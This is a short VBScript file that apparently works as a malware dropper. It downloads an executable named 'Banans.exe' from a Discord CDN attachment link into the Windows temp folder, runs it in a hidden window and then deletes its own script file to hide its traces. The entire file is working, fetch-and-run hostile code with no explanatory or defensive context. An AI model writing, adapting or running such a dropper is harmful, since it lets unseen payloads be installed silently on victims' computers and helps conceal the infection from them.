dim pOut, xHttp, bStrm
pOut = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\\Banans.exe"
Set xHttp = CreateObject("Microsoft.XMLHTTP")
Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/910776874014224424/910777018260549662/Banans.exe", False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile pOut, 2
end with
CreateObject("Wscript.Shell").Run """" & pOut & """", 0, False
CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName